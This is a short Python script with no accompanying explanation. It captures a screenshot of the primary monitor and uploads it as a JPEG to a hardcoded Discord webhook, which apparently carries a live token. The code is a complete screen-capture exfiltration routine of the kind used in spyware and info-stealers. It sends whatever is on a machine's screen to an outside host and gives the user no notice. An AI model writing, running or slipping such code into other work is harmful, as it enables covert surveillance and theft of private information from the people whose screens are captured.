import requests, time, mss, io
from PIL import Image

def main():
  webhook = 'https://discord.com/api/webhooks/1387771873450000567/WLq_b-LvTwHl5BfWMaT-k6qH9OfuEdUMemjN3EdUa93lcP4jgN1wO-xTW9OL-KY0W_wk'
  send(webhook)

def send(WEBHOOK_URL):
  sct = mss.mss()
  monitor = sct.monitors[1]
  img = sct.grab(monitor)
  image = Image.frombytes('RGB', img.size, img.rgb)

  buf = io.BytesIO()
  image.save(buf, format='JPEG', quality=70)
  buf.seek(0)

  files = {
    'file': ('screenshot.jpg', buf, 'image/jpeg')
  }

  response = requests.post(WEBHOOK_URL, files=files)
  print(f"Uploaded screenshot: {response.status_code}")


if __name__ == '__main__':
  main()